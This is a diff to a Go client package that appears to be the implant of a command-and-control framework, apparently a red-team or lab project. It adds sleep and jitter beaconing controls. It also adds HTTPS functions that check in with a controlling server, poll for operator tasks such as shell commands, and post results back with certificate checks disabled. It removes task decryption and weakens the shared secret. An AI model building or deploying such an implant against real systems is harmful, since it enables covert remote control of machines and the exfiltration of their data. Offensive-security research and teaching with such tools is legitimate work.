@@ -1,13 +1,19 @@
 package client
 
 import (
+	"bytes"
 	"crypto/rsa"
+	"crypto/tls"
 	"encoding/json"
 	"errors"
+	"fmt"
+	"io/ioutil"
 	"log"
+	"net/http"
 	"os"
 	"os/signal"
 	"runtime"
+	"strconv"
 	"time"
 
 	"github.com/gorilla/websocket"
@@ -65,7 +71,6 @@ var Client *data.Client
 var ServerHostName string
 var ServerPort string
 var ServerSecret string
-
 var clientCert string
 
 var clientKey string
@@ -75,7 +80,7 @@ var caCert string
 func init() {
 	ServerHostName = "192.168.56.1"
 	ServerPort = "443"
-	ServerSecret = "TestTestTestTest"
+	ServerSecret = "test"
 	CheckedIn = false
 	CheckedInChan = make(chan interface{})
 	ClientDone = make(chan interface{})          // Channel to indicate that the receiverHandler is done
@@ -119,21 +124,39 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	var cmdError error
 	var downloadTask bool
 	var screenshotTask bool
+	var sleepTask bool
+	var jitterTask bool
 	m := &data.Message{}
 	t := &data.Task{}
 	err := json.Unmarshal(message, m)
 	// decrypt incoming task
-	decryptedTask, err := DecryptMessageWithSymKey(m.MessageData, []byte(ServerSecret))
-	if err != nil {
-		return err, nil
-	}
-	err = json.Unmarshal(decryptedTask, t)
-	//err = json.Unmarshal(m.MessageData, t)
+	/*
+		decryptedTask, err := DecryptMessageWithSymKey(m.MessageData, []byte(ServerSecret))
+		if err != nil {
+			return err, nil
+		}
+		err = json.Unmarshal(decryptedTask, t)
+	*/
+	err = json.Unmarshal(m.MessageData, t)
 	if err != nil {
 		log.Printf("Error Handling Task\n")
 		return err, nil
 	}
 	switch t.Command {
+	case "sleep":
+		Client.Sleeping = true
+		result, cmdError = basic.Sleep(t.Args[0])
+		Client.Sleeping = false
+		sleepTask = true
+	case "jitter":
+		j, err := strconv.Atoi(t.Args[0])
+		if err != nil {
+			result, cmdError = fmt.Sprintf("Failed to set jitter To %s", t.Args[0]), nil
+			break
+		}
+		Client.Jitter = j
+		result, cmdError = fmt.Sprintf("%s", t.Args[0]), nil
+		jitterTask = true
 	case "die":
 		ClientInterrupt <- os.Interrupt
 		result, cmdError = "Stopping", nil
@@ -312,6 +335,7 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 	if t.Command != "shell" {
 		result += "\n" // makes output a little better
 	}
+	fmt.Println(result)
 	if cmdError != nil {
 		return nil, &data.TaskResult{
 			ClientId:   t.ClientId,
@@ -336,6 +360,24 @@ func ClientHandleTask(message []byte) (error, *data.TaskResult) {
 			TaskId:     "DownloadTask",
 		}
 	}
+	// so server knows to update client sleeping status
+	if sleepTask {
+		return nil, &data.TaskResult{
+			ClientId:   t.ClientId,
+			OperatorId: t.OperatorId,
+			Result:     result,
+			TaskId:     "SleepTask",
+		}
+	}
+	// so server knows to update client sleeping status
+	if jitterTask {
+		return nil, &data.TaskResult{
+			ClientId:   t.ClientId,
+			OperatorId: t.OperatorId,
+			Result:     result,
+			TaskId:     "JitterTask",
+		}
+	}
 	return nil, &data.TaskResult{
 		ClientId:   t.ClientId,
 		OperatorId: t.OperatorId,
@@ -355,6 +397,101 @@ func ClientHandleCheckInResp(message []byte) (error, string, *rsa.PublicKey) {
 		return err, "", nil
 	}
 	return nil, c.ClientId, c.RsaPublicKey
+}
+
+func ClientDoCheckInHttps(client *data.Client, endpoint string) error {
+	checkInMessage := data.Message{
+		MessageType: "CheckIn",
+		MessageData: client.ToBytes(),
+	}
+	log.Println(string(checkInMessage.ToBytes()))
+	req, err := http.NewRequest("POST", endpoint, bytes.NewBuffer(checkInMessage.ToBytes()))
+	if err != nil {
+		return err
+	}
+	req.Header.Add("authorization", ServerSecret)
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	c := http.Client{Transport: tr}
+	resp, err := c.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	msg, err := ioutil.ReadAll(resp.Body)
+	log.Println(string(msg))
+	err, messageType := utils.CheckMessage(msg)
+	switch messageType {
+	case "CheckIn":
+		err, uuid, publicKey := ClientHandleCheckInResp(msg)
+		if err != nil {
+			log.Fatal(err)
+		}
+		if publicKey == nil {
+			log.Fatal("Failed to get rsa key pair.")
+		}
+		Client.RsaPublicKey = publicKey
+		Client.ClientId = uuid
+	default:
+		return errors.New("Invalid checkin response message.")
+	}
+	return nil
+}
+
+func ClientHttpsPollHandler(client *data.Client, endpoint string) ([]data.Task, error) {
+	req, err := http.NewRequest("GET", endpoint, nil)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Add("authorization", ServerSecret)
+	req.Header.Add("id", client.ClientId)
+	fmt.Println(client.ClientId)
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	httpClient := http.Client{Transport: tr}
+	resp, err := httpClient.Do(req)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+	dataTasks, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+	tasks := make([]data.Task, 0)
+	err = json.Unmarshal(dataTasks, &tasks)
+	if err != nil {
+		return nil, err
+	}
+	return tasks, nil
+}
+
+func ClientHttpsSendResultsHandler(client *data.Client, endpoint string, results []data.Message) error {
+	jsonResults, err := json.Marshal(results)
+	if err != nil {
+		return err
+	}
+	fmt.Println(string(jsonResults))
+	req, err := http.NewRequest("POST", endpoint, bytes.NewBuffer(jsonResults))
+	if err != nil {
+		return err
+	}
+	req.Header.Add("authorization", ServerSecret)
+	req.Header.Add("id", client.ClientId)
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	c := http.Client{Transport: tr}
+	resp, err := c.Do(req)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
+	msg, err := ioutil.ReadAll(resp.Body)
+	log.Println(string(msg))
+	return nil
 }
 
 func ClientDoCheckIn(client *data.Client) error {
